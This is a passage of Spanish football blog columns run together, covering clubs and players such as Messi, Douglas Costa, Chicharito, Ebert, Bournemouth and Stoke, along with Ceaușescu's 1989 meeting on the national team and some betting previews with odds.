no ha dictado sentencia sobre el césped, en nuestros corazones se disputa la temporada completa. Imaginamos los encuentros, el desempeño de los viejos futbolistas y también de los nuevos, calibramos en nuestra inconsciencia el alcance de las lesiones, las estiradas de los porteros, en un ábaco encogido por el miedo calculamos los puntos necesarios para salvarnos. En cada uno de nosotros el dardo de la inquietud y de la gloria, da igual la experiencia vivida, tampoco importa no conocer ni la posición en el campo de la cesión que nos viene de un equipo de Primera. Hay en nuestras privilegiadas cabezas una máquina de sueños y una máquina de pesadillas que funcionan a pleno rendimiento en agosto, precisamente cuando el calor más aprieta.Dice Toni Cruz en “Infinita pasión”, un completísimo y recomendable libro sobre la historia del Córdoba, que “el sol sale en todas partes, pero no en todas al mismo tiempo”. Imagino en esa frase a cada equipo. Su Córdoba en Segunda queriendo –de nuevo- subir, el Eibar en Primera intentado, esta vez por méritos propios, no bajar. El futuro de los pequeños y de los grandes. De la Europa del Madrid a la permanencia del Leganés, del Mundial de Clubes al playoff de Segunda B. Todo se ha jugado ya en el imaginario futbolístico del socio que fluctúa entre la celebración desaforada y la tristeza contenida. No saldrá el sol para todos este año. Habrá luz y habrá sombra, como siempre desde que el fútbol es fútbol.La otra mañana hablé con mi amigo Galder Reguera por teléfono. Hablamos de un texto estupendo al que da vueltas. Sobre fútbol. Sobre lo que este deporte significa para todos nosotros y sobre todo para su hijo Oihan. Y habló de la “mentira” -dicho con un cariño paternal- que nos supone este deporte. Una mentira que viene dada por la mirada cándida del aficionado. De que el fútbol es, al fin y al cabo y en sus palabras: “lo que queremos creernos que sea”. Con esta idea abordé estos párrafos. Hoy que echo un vistazo a lo que se escribe sobre mi equipo. Que busco referencias de los nuevos fichajes. Hoy que dispongo de los nombres en un papel, que alineo palabras y manchurreo de flechas un cuadernito con un improvisado campo a bolígrafo. Jugadores a los que veo casi pasarse la pelota, fallar algunos –a los que tengo manía por otras cosas-, a los que aciertan –porque vienen de un equipo serbio que siempre me gustó-. Hoy que ya visualizo el marcador de mi estadio anotando el primer gol de la temporada. Un gol de cabeza, a saque de córner, contra un rival que nos apeó del ascenso hace tres años. Hoy que juego en mi cabeza cada partido del futuro pienso que el fútbol es una entrañable mentira que se juega en agosto. Cuando aún el balón no está mordido por los tacos, ni tintado de clorofila por el césped, ni desinflado por los golpes al palo. El día 22 de agosto empieza la Liga. Para entonces cada aficionado tendrá un ganador en su cabeza, y todos los equipos, por poder soñarse, merecen ese trofeo. Las gradas pueden representar el lado más salvaje del fútbol. Ya no hablo de peleas, aludes y bengalas sino de ese coro sin escrúpulos que entona canciones sin límite, gruesas, lesivas, de mal gusto. Como si hubiera necesidad de insultar para acentuar el descrédito del rival, para sentirse superior a él. Una legión de malhumorados bordea la frontera de lo insano, impunemente se desgañitan para animar a los suyos punzando la sentimentalidad del contrario. Se reabre el debate tras la inclusión en el acta arbitral de Ayza Gámez el tristemente famoso “Mourinho muérete” durante el partido que enfrentó a Atlético de Madrid y Mallorca.Es una excepción. Lo habitual es la absoluta permisividad en este tema. Recuerdo el plante de Eto´o ante el Zaragoza, o algunas sanciones en Italia tras gestos humillantes a jugadores negros.Como queriendo tensar una cuerda a la que aún no le habían dejado agarrarse, Leo Messi, que cuando huele sangre activa la maquinaria, no apareció aquella mañana por las instalaciones del Barça. Localizado el argentino, éste excusó su ausencia con una gastroenteritis, enfermedad que actúa, a efectos laborales, como una lumbalgia en el resto de los mortales. Intente usted demostrar su veracidad. Sabiendo Messi como sabía que la posición de su técnico no era la más cómoda tras la derrota en Anoeta, ¿qué pretendía forzar con su infantil ausencia? Ladino como pocos, el astro argentino vio en el momento de debilidad de Luis Enrique una ocasión excepcional para retar a un pulso a su técnico en presencia de la directiva, de aquellos que tienen capacidad para poner al aún entrenador azulgrana en la calle. ‘O el míster, o yo’, vino a decir el rosarino con su desafío ante una situación de tensión que ya no escapa a nadie y en la misma semana en el que el responsable de su perfil en Twitter decidió ponerse inoportunamente juguetón. No es novedad, porque es una sensación ya percibida desde tiempo atrás, el hecho de que el barcelonismo tiene auténtico pánico a perder a su ídolo. Messi lo sabe, y juega con ese temor siempre a su favor.La sucesión de acontecimientos acabaría coronándose el miércoles con el demandado anuncio de convocatoria de elecciones por parte del presidente Bartomeu. Acortar su mandato ha debido de suponer una decisión complicada para el hombre que se encontró sentado en un sillón que no era el suyo tras la huída a la desesperada del jefe de la plancha electoral. Empeñado, justo ahora y no hace meses, en ‘rebajar la tensión desproporcionada‘, el heredero del trono de Rosell decidía adelantar los comicios un año y programarlos, a cinco meses vista, para la conclusión de la actual temporada. En la previa de la apertura de un mercado de fichajes al que el FC Barcelona no podrá comparecer. Sin director deportivo, con su principal estrella tendiendo pulsos a cualquiera que ose discutir su autoridad y con un técnico que parece no haber superado el periodo de prueba. Demostrando una vez más que no hay club en el mundo que programe sus periódicas fases de autodestrucción como el Barça. Una especie de mecanismo interior de seguridad y precaución me hace desconfiar, de entrada, de todos aquellos futbolistas sudamericanos, preferiblemente brasileños, procedentes del fútbol de Europa del este. No se me entienda mal, pero ese perfil de futbolista que prefiere la calurosa acogida que siempre proporcionan el petróleo y el gas antes que la competitividad de una liga más cercana me inspira poca confianza, por muy habitual que se haya convertido en estos últimos tiempos.Douglas Costa aterrizó en la lejana Donetsk, en el extremo oriental de Ucrania, un gélido día de enero del año 2010. Sin haber cumplido aún los veinte años, y tras un par de temporadas en el Grêmio, el extremo dejaba atrás Porto Alegre y se embarcaba en una aventura arriesgadísima enrolándose en un club en pleno crecimiento para jugar en una liga prácticamente invisible. Iba a ser complicado salir de allí.Cuatro años y medio después de su llegada a Europa, Douglas es ya un futbolista hecho. Lo suficientemente hecho, al menos, como para provocar que un gigante europeo como el Bayern se decidiese a poner sobre la mesa ucraniana los treinta millones de euros necesarios para hacerse con sus servicios, convirtiéndose así en el cuarto fichaje más caro en la historia de la entidad bávara.‘El Guardiola del Bayern ya tiene a su Messi‘, leía el sábado en Twitter en referencia al veloz extremo brasileño. Y la comparación es, sin duda, disparatada, pero apunta varias ideas acerca del aporte del exjugador del Shakhtar en Múnich. Con Douglas en el campo el Bayern gana en desborde y en capacidad de sorprender al rival en velocidad y a través de la conducción de balón. Es una alternativa, la ruptura del brasileño, al juego combinativo cuando éste se atasca y no fluye con suavidad. Porque Douglas es de los extremos que siguen disfrutando jugando realmente desde el extremo, abriendo el campo y ofreciendo balones desde el costado. No solo finalizando jugadas, sino edificándolas y contribuyendo a su gestión.Su arranque de campaña está confirmando las buenas sensaciones ya dejadas durante la pretemporada. Pleno de confianza, Douglas es ya uno de los futbolistas más desequilibrantes e incisivos de este nuevo Bayern tras uno de los periodos de adaptación a un nuevo club y un nuevo campeonato más breves que se recuerdan. Fue decisivo el sábado en Hoffenheim, como anteriormente lo había sido ante el Hamburgo en la primera jornada y ante el Wolfsburgo en la Supercopa alemana. No solo sustituye al renqueante Ribéry, sino que lo mejora considerablemente. Quizá afirmar que Pep ya tiene a ‘su Messi’ sea una insensatez. A quien sí tiene es a su Douglas. Real, adaptado y brillantemente determinante. ‘Él siempre está ahí, a punto de marcar en el momento más importante para su equipo‘. Quien así elogiaba a Javier Hernández (Guadalajara, México, 1988) sabía un poco de lo que va este asunto. Sir Alex Ferguson se frotaba las manos con el rendimiento del delantero mexicano. Saliendo casi siempre como revulsivo desde el banquillo, el exfutbolista de las Chivas de Guadalajara, era un seguro de vida en el área rival. Un rematador oportuno, perspicaz y con un don especial para rescatar partidos que se marchaban directamente por el sumidero. Y, todo ello, con el incalculable valor añadido de ser el ocupante ideal de un banquillo. Ni una palabra más alta que otra, ni una protesta por su reiterada suplencia, asumiendo perfectamente su rol de rescatador en los momentos difíciles. Educado y con una profesionalidad modélica. Con sus altibajos, lógicos en cualquier goleador, pero con un rendimiento bastante regular (salvo quizá el considerable bajón de la pasada temporada, la más floja del Chicharito… y del Manchester United). El mexicano promedió un gol cada poco más de ochenta minutos en sus tres primeras temporadas en Europa, con el hándicap natural de haber empezado pocos de sus más de cien encuentros vistiendo la camiseta red devil como titular y con la obligación de pelear por cada minuto de juego. Como una especie de Solskjaer del siglo XXI. Cara de niño e instinto de firmante de ‘From Hell‘. Su incorporación al Real Madrid (en calidad de cedido, previo pago de dos millones de euros) se ajusta a la satisfacción de una necesidad real. Cubrir una posición como la que el punta mexicano viene a cubrir no es tarea sencilla en un club que siempre aspira a firmar los movimientos más relevantes del mercado. El Chicharito, fichaje que bien podría ser considerado como de serie B en comparación con el habitual elenco de estrellas que acostumbra a pescar el madridismo, se amolda a la perfección al hueco que quedó vacante tras la salida de Gonzalo Higuaín hace ahora un año. No es lujo, quizá no ilusiona y no es presunción ni pavoneo. Es, esta vez sí, necesidad básica de un club aspirante a lo máximo. Un delantero con un buen ratio de goles por minuto, acostumbrado a entrar en los partidos con el tiempo justo para tocar tres balones e inyectarles la necesaria dosis de veneno y que no tendrá problemas, vistos los antecedentes, en asumir su rol de actor de reparto. Siempre estará ahí, para cuando se requiera de sus servicios. Ya lo decía el añorado Ferguson.Puedes comprar camisetas de Chicharito Hernández (aún como jugador del United, eso sí) en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Patrick Ebert es un buen futbolista. Es más, probablemente sea el mejor futbolista de la plantilla del Real Valladolid. Ocurre, sin embargo, que por encima de sus condiciones para la práctica del fútbol el jugador alemán suele anteponer una conducta impropia, alejada de lo que debería ser un profesional del deporte. Desde su llegada a la capital castellana la temporada pasada siempre tuve encima la sensación de que Ebert considerada en su fuero interno que él estaba por encima de la misión que había tenido a bien aceptar. Zorrilla era para él poco más que una estación de paso, un escaparate en el que lucirse y exhibir sus armas. La puerta de entrada a un fútbol que, por fortuna para él, no conocía de sus andanzas en Berlín y en el que empezar de cero se presentaba como la gran oportunidad para relanzar su hasta el momento accidentada carrera deportiva. Y así fue al menos durante su primera temporada a orillas del Pisuerga. Ebi convenció a los incrédulos y se convirtió en una de las piezas fundamentales del buen Valladolid de Miroslav Djukic.Ebert, que había firmado un prudente contrato de apenas un par de temporadas con los pucelanos, llegó al pasado verano con las maletas hechas y preparadas para salir zumbando en busca de lo que él consideraba un destino mejor. Ya durante la temporada había sido visto con José Luis Pérez Caminero disfrutando comida en Segovia y, probablemente, cerrando flecos sobre la posible incorporación del alemán al Atlético de Madrid. Fue su primer acto grave de indisciplina. Su primera gran muestra de algo que cada vez se hacía más evidente: Ebert estaba en Valladolid única y exclusivamente para dejarse ver y ganarse un contrato en una plaza más apetecible. Sin embargo, su salida del club blanquivioleta, que parecía algo cantado allá por el mes de junio, se frustró. Los teóricos pujadores se echaron atrás ante la situación de un futbolista que en apenas un año terminaba su contrato y al que el club castellano se iba a ver obligado a traspasar a precio de saldo si quería sacar un mínimo rendimiento económico de su salida. De pronto, Ebert se encontró ante una situación radicalmente nueva, inesperada, y frente a la que no sabía desenvolverse.Los cinco meses que han transcurrido de la presente campaña han dejado en evidencia al futbolista. No solo continúa sometido a la dictadura de sus excesivamente habituales lesiones y problemas físicos de toda índole (algunos absolutamente esperpénticos), sino que su actitud sobre el césped ha dado un giro hacia la intrascendencia con respecto al buen futbolista que Zorrilla pudo disfrutar hace apenas unos meses. Ebert, que apenas ha participado en trece de los veintiún partidos de su equipo. No ha vuelto a ser, salvo quizá en un par de contadas ocasiones, aquel futbolista resolutivo y decisivo que el año pasado consiguiera llamar la atención de varios clubes españoles. Su cotización ha caído hasta el punto de que el Valladolid no es capaz de encontrarle destino en este mercado de invierno y acabar con un problema que el vestuario tiene ya bien identificado y señalado.El último y grave desplante del alemán, autodescartándose de la convocatoria de JIM apenas unas horas antes del partido del pasado sábado ante el Villarreal, puede haber supuesto su sentencia definitiva. Apartado de los entrenamientos del primer equipo y expedientado por el club, Ebert ha perdido definitivamente la complicidad de la grada por anteponer sus intereses personales al beneficio del club para el que trabaja, en una vuelta a las andadas que recuerda demasiado a sus tiempos berlineses. Si quería que el club le abriese las puertas para su salida lo ha conseguido. Lo hará, eso sí, por la puerta de atrás. Con una maltrecha imagen que sanear y dejando un desagradable poso de egoísmo y poca profesionalidad en Pucela. Dicen que si todos y cada uno de los pubs que existen en la localidad de Bournemouth estuvieran con el cartel de aforo completo, alrededor de cuarenta mil personas estarían bebiendo pintas en la pintoresca localidad costera. En contraste con este lúdico dato, únicamente once mil setecientos de los cerca de ciento noventa mil habitantes de Bournemouth pueden disfrutar de un partido de fútbol en directo en Dean Court (hoy Goldsands Stadium por motivos comerciales). Porque Bournemouth no es la típica ciudad residencial conectada a un importante área industrial, con sus barrios de casitas unifamiliares perfectamente uniformadas acogiendo a la multitudinaria clase obrera. En Bournemouth, localidad volcada hacia el sector servicios, se acostumbra a estar trabajando cuando llega el fin de semana y la jornada futbolera. Porque Bournemouth, a unos 150 kilómetros al suroeste de Londres, no es una ciudad futbolera, es un resort vacacional gigante.En Bournemouth, ciudad de vacaciones y destino habitual de la clase media local, encallaban despistados aquellos españoles que dos décadas atrás abrieron tímidamente camino a la abusiva marea humana en busca de oportunidades que amenaza a día de hoy con desbordar el Reino Unido. No había mucho más que hacer aparte de fregar platos, recoger cientos de pintas vacías o hacer camas en alguno de los cientos de hoteluchos que salpicaban sus callejuelas.Veremos.Partido para amasar una buena suma en caso de Argelia sea capaz de dar la campanada. La  victoria del combinado inglés se paga a 1,27 por euro apostado en Betfair.com mientras que la victoria argelina cotiza a 17 euros por euro apostado. Improbable pero goloso. El  empate se cotiza a 6.2. Octubre de 1989. A los regímenes comunistas les quedan dos telediarios pero Nicolae Ceauşescu sigue empeñado en exprimir el limón en Rumanía. En endurecer lo que ya era pura supervivencia. Mientras los checos o los polacos abren la mano Ceauşescu no suelta las riendas del país, azuzándolo en una carrera estúpida hacia ninguna parte. Entonces, ignorante de que iba a ser ejecutado dos meses más tarde a manos de un pelotón militar en Târgovişte y con la nación calada hasta los huesos en hambre y decadencia, su despótica excelencia decide poner el punto berlanguiano al asunto y se reúne con el Comité Político Ejecutivo del Partido Comunista Rumano para tratar una cuestión ineludible: la preocupante actualidad de la selección de fútbol.Resulta que la tricolor había tenido la ocurrencia de abandonar Copenhague con un sonoro 3-0 en la mochila y con ello comprometer su concurso en el Mundial 90. Al otro lado del continente Ceauşescu fumaba en pipa. Uno se hacía una idea lejana de como cayó aquella derrota en el lunático cerebro del líder (a la proverbial querencia por presumir de éxitos deportivos de la que hace gala hasta el último politicastro se unía su manía por apañar en beneficio del Steaua de Bucarest) y por qué convocó a los sabios pero hoy sabemos a ciencia cierta lo que sucedió en aquella histórica cuchipanda. Gracias a los estudiantes de la Facultad de Historia de Bucarest y su estupenda labor de buceo en los archivos del antiguo Partido Comunista.Entre los documentos resucitados están los que reproducen las discusiones acontecidas justo después de la derrota en Copenhague. Ceauşescu, desatendiendo con despreocupado ánimo la realidad nacional, abre la reunión con el descalabro de los chavales en Dinamarca. Lo primero es lo primero. Y los diálogos muestran como el caudillo, posiblemente entre exabruptos de obligada omisión, formula ante su señora y el resto de dirigentes una solución maestra y radical para garantizar el futuro del combinado patrio. El genio de los Cárpatos, como gustaba de ser conocido, amenaza con disolver los dos equipos más grandes del país (Steaua y Dinamo) en caso de los artistas (la mayor parte de la selección se ganaba la vida en esos dos clubes) no espabilen. No como lo haría todo un Jesús Gil al reconocer la insuperable operativa, pero lean y lloren.Nicolae Ceauşescu: ¿Habéis visto lo que pasó ayer en el partido de futbol? Constantin Dăscălescu (Primer Ministro): Pura y simplemente una falta de organización Elena Ceauşescu (esposa del sátrapa): Han jugado mal, pero en cualquier caso, no son asuntos que conciernan a un miembro del gobierno.N.C: El gobierno también es responsable, ya que responde tanto de la cultura como del deporte. ¡Es la ley! ¿Hace falta ir hasta allí para dejarse marcar 3-0? E.C: De todas formas ha sido una vergüenzaN.C: Le he dicho a Bobu que si aquí (en el partido de vuelta, en Bucarest) no consiguen los dos puntos (las victorias valían dos puntos entonces) disolveremos los equipos que han aportado jugadores a la selección. Comunicádselo al Ministerio de Interior.Silviu Curticeanu (Jefe de la Cancillería): El camarada Milea (Vasile Milea, Ministro de Defensa) no esta presente en la reunión, está en Buzău, por las elecciones.N.C: Él lo entenderá. Repito, disolveremos los equipos que han aportado jugadores a la selección si no ganamos aquí.E.C: El ejército no ha aportado ni un solo jugador. Uno era del Universidad de Craiova, y el resto venóan del Dinamo.N.C: No saben ni defenderse, han aprendido a ganar en casa con 5 o 6 goles de diferencia pero fuera no hacen nada. 8…) ¡No es posible! Podemos perder pero esto ha sido vergonzoso, ni siquiera han jugado. No es que les hayan ganado, es que no han jugado. ¡No es posible! Esto no es la orden del día pero no hay que pasarlo por alto, hay que tomarlo como una lección. No es un punto de la orden del dia, pero hay que tomar medidas para poner fin a esta situación, poner orden, porque esto no podemos continuar así.Afortunadamente Ceauşescu no tuvo que poner en práctica sus bravatas. El once de Emerich Jenei, en el que figuraban cromos indispensables del álbum rumano como Popescu, Dorin Mateut, Camataru o el mismísimo Gica Hagi, se impuso en el partido de vuelta (3-1) y Rumanía acabó clasificándose con solvencia para el Mundial italiano. Más tarde llegó la derrota contra los irlandeses en Génova aunque para entonces, por suerte para todos los rumanos, Nicolae Ceauşescu ya estaba bajo tierra. No es lo mismo apostarte un dinero en Villarriba que en Villabajo. A los ricos les va a alcanzar con una gotita del lavaplatos milagroso para liquidar el asunto, seguir con la sobremesa y si se tercia atacarle a la siesta. Lo tienen prácticamente hecho. Pero en el villorrio aun quedan una montaña de cacharrería por limpiar y está costando sudores sacar la mugre acumulada. Imaginen que Manchester pertenece a la provincia afortunada jabonísticamente (y está se lo robo al ya ex-director de Marca) y Málaga, Alicante y Lecce a los territorios desheredados de la tecnología sacagrasas.Y aprender a balbucear inglés, claro. Parejas de jubilados paseando bajo el benévolo sol costero, excursiones de adolescentes sedientos de alcohol y de lo que no es alcohol y despedidas de soltero/a que harían abochornarse al más desvergonzado. Pero de fútbol, escaso rastro.Porque aunque el Boscombe Football Club (desde 1923, Bournemouth & Boscombe Athletic Football Club, y ya a partir de 1972 simplemente AFC Bournemouth) viese la luz allá por el año 1899, su trayectoria a lo largo de la historia no ha sido precisamente prolífica y acostumbrada al éxito. Habitual de las divisiones menores del fútbol inglés, tal vez su mayor logro sobre el césped se corresponda con la eliminatoria de tercera ronda de la FA Cup de 1984 en la que, contra todo pronóstico, protagonizaron una de esas fábulas del rico contra el pobre tan propias de la competición copera inglesa al eliminar al campeón Manchester United gracias a un dos a cero en Dean Court. Desde el tercer peldaño del fútbol inglés y bajo el mando en el banquillo de un jovencísimo Harry Redknapp, que se tomó aquel enfrentamiento como el reto personal que daría definitivo impulso a su carrera como técnico.Ron Atkinson, técnico del United, había admitido torpemente en las horas previas al partido que para su equipo aquello no era más que un simple entrenamiento. Aquellas palabras hicieron profunda mella en el orgullo de Redknapp. ‘¿Habéis escuchado todos sus palabras sobre el partido, verdad? Entonces, ¿qué otra motivación necesitáis para salir ahí y derrotar a ese equipo? ‘. Y les costó, pero lo consiguieron. Primero con un error al tratar de blocar un córner de Bailey, portero del United, aprovechado por Milton Graham para remachar a la red, y poco más tarde ampliando la ventaja y disparando la euforia con el gol de Ian Thompson, dos futbolistas que eran dos completos desconocidos y que, como no podía ser de otra forma, continúan viviendo en el anonimato más absoluto.Pasaron los años, las décadas incluso, y Bournemouth volvió a la habitual normalidad futbolística. Sin embargo, un nuevo capítulo en la historia de los Cherries marcaría el devenir de la entidad costera. Una deuda acumulada de cerca de cinco millones de libras llevó al club a caer en administración en febrero del año 2008. Las consecuencias deportivas, con sanción de diez puntos incluida, se hicieron notar enseguida: el club perdió la categoría y dio con sus huesos en la League Two (cuarto peldaño de la estructura piramidal). Un año más tarde, firmaría la salvación en la última jornada. Había tocado fondo. Ya solo quedaba recuperarse y crecer.Crecer hasta hoy. Hasta el final del año 2014, con el equipo autoritariamente instalado en la cabeza de la clasificación de la Championship después de haber conseguido tres ascensos en cuatro campañas. Dispuesto a asumir de la mano del joven Eddie Howe, esta vez sí, el gran reto de su historia: convertir por fin al macro-resort de vacaciones en una ciudad cien por cien futbolera y con un equipo en la mejor competición del planeta.Puedes comprar camisetas del AFC Bournemouth en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Además, esta semana y hasta el próximo día 1 de enero, disfruta de un 20,15% de descuento para celebrar el nuevo año con el código CFS2015. Ponte en el lugar de Jens Keller, aunque sea por unos minutos. No eres el personaje más querido en tu club. Nunca has sido un tipo carismático ni con dotes de liderazgo y jamás has conseguido hacer olvidar a la persona a la que viniste a sustituir en el banquillo del Schalke 04. Tu paso por Gelsenkirchen no tiene pinta de que vaya a ser memorable, no va a pasar de ser otra muesca más en la grisácea pared de tu vida. Para colmo de males, la gran baza europea del equipo se va a esfumar por la vía de la contundencia y la bofetada de realidad. Después de un sonrojante 1-6 en Gelsenkirchen, en el que tal y como cayeron seis goles en contra pudieron haber caído ocho o nueve, la competición te trae un partido de vuelta en la eliminatoria que más que un partido es una condena, un compromiso al que hubieras dado dinero por no tener que asistir. ¿De qué manera se puede afrontar un partido como el que el conjunto minero debe encarar esta noche en el Santiago Bernabéu? ¿Cómo dispones a tus jugadores para que salgan a competir sabiendo no sólo que la eliminatoria está perdida, sino que la humillación es un hecho irrefutable y sobre la que no existe purga posible? ¿Reservas a tus mejores futbolistas e intentas pasar por el choque de puntillas y haciendo el menor ruido posible? ¿Sales con todo para, al menos, tratar de demostrar a todo el continente que lo de dos semanas atrás no fue más que un accidente y que tu equipo está a la altura que demanda la competición?No debe pasarse por alto el hecho de que el Schalke está realizando un buen papel en la Bundesliga. El equipo es tercero en la tabla, a solo un puntito del dubitativo y tembloroso Dortmund, con lo que el subcampeonato parece una empresa al alcance de los de Keller. Yo, en semejante tesitura, me centraría en lo que sí queda a mi alcance, abstrayendo a la plantilla por completo del compromiso continental, haciendo ver que hay que cumplir el trámite pero sin mayor dedicación que la mínima imprescindible. Conservando a los Draxler, Huntelaar, Boateng y compañía para meter mano al Braunschweig el próximo sábado y dejar claro que quiero esa segunda plaza. En semejante escenario, gana enteros la visión del partido de esta noche como poco más que un estorbo en el camino, como un episodio en el que lo único que hay son cosas que perder. Pero no es plato de gusto para ninguna afición que su equipo salga goleado y humillado en una confrontación europea. La balanza está demasiado equilibrada como para decantarse por una u otra opción. Tras la J6, el desplome de Sergio, que empezó como líder destacado en las primeras jornadas del Reto de apuestas en bwin, es un hecho. Quiso apretar en la combinada, con una opción que no sonaba demasiado improbable, pero el Madrid se la jugó al encajar un gol en el primer tiempo.Este fin de semana apostamos en el Arsenal-Manchester United, el Málaga-Hércules y en el Chievo-Lecce de la mano de bwin.Arsenal y Manchester United jugarán el domingo, a las 14:00 en el Emirates, uno de estos partidos por los que a final de temporada aficionados, clubes, televisiones y hasta el último directivo puede sacar pecho y presumir de estar haciendo la mejor liga del mundo. Flota en el ambiente la vaga idea de que el United aun podría complicarse el paseo hasta el título si se deja puntos frente al Arsenal o al Chelsea pero tal cosa se acerca, casi roza, la definición de milagro vista la fiabilidad de los de rojo durante la temporada en curso.Para más inri la tarjeta Red Devil (intachable en casa) no desmerece en los viajes donde solo han caído en tres ocasiones y frente al Arsenal la historia habla a su favor. Los de Wenger solo le han podido meter mano en una ocasión de las últimas once, que se dice pronto. Es un partido atractivo para el espectador pero en el que el United debe comenzar a empaquetar la liga. La victoria visitante se paga a 2.70. Málaga y Hércules, decimoséptimo y penúltimo respectivamente han quedado para la pelea en el callejón de atrás. Partido en el alambre como pocos, sobre todo para la cada vez más ruinosa entidad alicantina, y de los que sirven para echarte seis puntos a la mochila. Los tuyos y los del damnificado. La Rosaleda (domingo a las rabiosamente futboleras cinco de la tarde) recibe a un Málaga envuelto en buenas vibraciones tras sumar siete puntos seguidos a lomos de Julio Baptista.El Hércules es un flan desde tiempos inmemoriales y aunque con Djukic bracea, ahí está el triunfo ante el Depor en la última fecha, no logra escapar de una corriente más que peligrosa y el colchón se les está deshilachando. Dice Rufete, añadiendo al mejunje esa épica de cartón piedra tan del fútbol moderno, que este es el partido más importante de la historia del club. Exagera pero da idea de lo que se juegan los herculanos en Málaga. A 3.70 se paga un empate que sería oro para los alicantinos.Por último os propongo echar un vistazo a lo que pueda suceder en Verona, en el ya deteriorado óvalo en que el tiempo y la propia dinámica italiana han convertido al Marcantonio Bentegodi. El domingo en transalpino horario, 15:00, juegan el Chievo Verona, para concretar una salvación que ven cerca encabalgados en los 39 puntos y el Lecce, antepenúltimo con 35 y la vida encima del tapete. La racha de los salentinos es espantosa, siete de 21 en la mochila y dando por hecho que al Brescia y el Bari ya nadie les va a quitar el billete a la B, son los peor colocados en la pomada por evitar el descalabro. La plantilla habla de 40 como la cifra que les permita disfritar la A un año más pero es consciente de que el resultado final no depende de ellos. No obstante de lo que hagan este domingo en la escapada norteña dependerá su futuro. A 4.30 euros está marcada la cuota es caso de sorpresa giallorossa. Simeone ve con tanta claridad los partidos como las canillas de los rivales cuando se vestía de corto. Por eso la mejor previa de lo que queda de Supercopa la ofreció él, actor principal en la función, en rueda de prensa. “Ojalá jueguen Messi y Neymar, sería bueno para el espectador. Seguro que nos vamos a encontrar con el mejor Barcelona. Ellos son mejores. Lo normal es que tengan más dominio, más ocasiones… Pero son 90 minutos y nos vamos a preparar para responder de la mejor manera y ganar” El Cholo deseó lo que todos y anticipó lo previsible. Todos babeamos con la posibilidad de que el Tata junte por fin a dos de los mayores talentos del mundo en el mismo once y todos también suponemos que el Barcelona saldrá ambicioso. Obligados por el escenario y las ganas de cambiar sensaciones recientes. Pero después está el Atlético…Frente a un Barcelona que tratará de quebrar el partido con posesión obsesiva y balones a la espalda de los centrales, el Atleti debe aferrarse a la idea defensiva que tan buena imagen provocó en la ida.Un centro del campo implacable para cortocicuitar esa circulación interior que los blaugranas han convertido en arte industrial y una atención especial sobre Messi para reducir posibilidades y daños. El resto del plan vendrá marcado por la efectividad al lanzar la contra de los artistas, como Arda, y la facilidad de los estiletes para rentabilizarla, Villa y un enchufadísimo Diego Costa. En la ida les salió a medias, en realidad no generaron más que el Barcelona, pero al menos bastó para competir de igual a igual y llegar con resuello para jugarse el título.El Barcelona parte como favorito por la renta amarrada en la ida, por la localía y por la calidad pero debe ser más imaginativo en ataque que en el Calderón. Si el balón circula con fluidez de banda a banda para que los extremos como Pedro encaren en ventaja, si hombres como Messi o Cesc (en la ida fue clave por eso) consiguen cambiar posiciones y remover el juego entre líneas el Barcelona, tendrán mucho ganado para hacer bueno el 1-1. El Atlético buscará lo contrario. Desde la organización y el voltaje cholista, obligar el juego interior para matarlo al borde del área. Una cosa es clara, si el partido es la mitad de bonito que en la ida, disfrutaremos como enanos. A pesar de los horarios más chapuceros del fútbol europeo…Apuestas en bwin1. A 1.33 la victoria del Barcelona. No pensamos sinceramente en que vaya a ocurrir otra cosa pero el potencial y excelente forma del Atlético pueden tentar para lanzarse a los 7.50 que pagan por su victoria.2. Que el primer tanto sea de Villa, se paga a 11, o de Diego Costa, a 12 por euro apostado. Apetecible.3. 7.50 vale un hat trick de Messi, al que Martino ha incluido en la convocatoria, y llegará con ganas de demostrar salud y protagonismo. Crawley Town FC, si escavásemos un agujero en el reluciente césped de Old Trafford y continuáramos horadando hasta el quinto estrato del sistema futbolístico allí les encontraríamos. Se han colado en la quinta ronda de FA Cup y jugarán, sacando la cabeza a ver que se cuece en el mundo real, contra el Manchester United precisamente en el Teatro de los Sueños. The Specials. Un himno. Dos tonos. Fiesta y canciones para la grada. A message to you Rooney. Munich 1958 y un mendrugo echando unas risas a cuenta del desastre, a lo Rambert, 50 años después. Lupa en mano imagino, le pillaron y no volverá a pisar un campo de fútbol. Todo en uno. This is England Revolviendo foros me di cuenta que la mayoría de aficionados del Stoke City, y los que no estaban allí lo han aprendido de sus padres y abuelos, continúan guardando en sus oraciones el viaje a Nottingham en el  79. Quince mil almas en la grada de Meadow Lane, el rival era el Notts County, apuraron el ruido hasta que Paul Richardson decidió abrir la puerta del ascenso a primera. A dos minutos del final en el último partido del año, la locura. Aquello, teniendo en cuenta la reputación de su hinchada  como  una de las más ruidosas del país, tuvo que ser grande, enorme, pero que aun perviva en el imaginario colectivo como El Pelotazo quizá os sirva para haceros idea de las dimensiones del próximo finalista de la copa inglesa.Al contrario que su rival en el próximo evento, un Manchester City que pese a sus proverbiales altibajos lleva la gallardía en el adn, al Stoke se le saca en la conversación por haber servido como rampa de lanzamiento para el legendario Stanley Matthews, para avergonzarse de las barrabasadas en las que hasta hace nada se entretenían sus hooligans (unos de los más violentos del país) y por ser el segundo club más veterano del mundo. Precisamente tras el Notts County. Imaginen como estarán ahora mismo los pubs de Straffodshire.Los potters, el apellido les llega por la tradición alfarera de la zona, la rompieron en 1972. Tras verse sometidos por el Arsenal en dos semifinales de FA Cup, el once del 72 supo arrancarle su pedacito a la historia venciendo al Chelsea en la Copa de la Liga. Aquel equipo lo comandaba Tony Waddington, por siempre el entrenador de los buenos viejos tiempos. El cromo. Waddington solía referirse al fútbol como el ballet de la clase obrera y merece página en los libros por su ojo clínico en el fichaje. Ahí es nada, reclutó a un Gordon Banks en la flor de la vida, más tarde firmó a Peter Shilton y también procuró la vuelta a casa a Stanley Matthews. Y como no daba puntada sin hilo se las arregló para que el genio del regate pesara, pasadas ya las cuarenta primaveras, en el ascenso a primera del 62. El míster llegó al Victoria en 1960 y se fue doce años después.El detalle de los entrenadores en el Stoke merece capítulo aparte. Entre 1923 y 1977 el club abrió la caja de las nóminas para cumplir con cuatro preparadores, procurando a cada uno de ellos una despampanante media de doce años en el cargo. Gil lloraría. En cambio desde 1977 han pasado por la sala del presidente nada más y nada menos que quince. Antes del próximamente canonizado Toni Pulis, la parroquia tuvo oportunidad de observar las evoluciones dispares del ex-jugador metido a locutor Chris Kamara pero también de Thordarson, el islandés que parecía puesto a dedo por la directiva (compatriotas suyos entonces) y acabó depositando al club en segunda. No obstante, pocos duraron más de 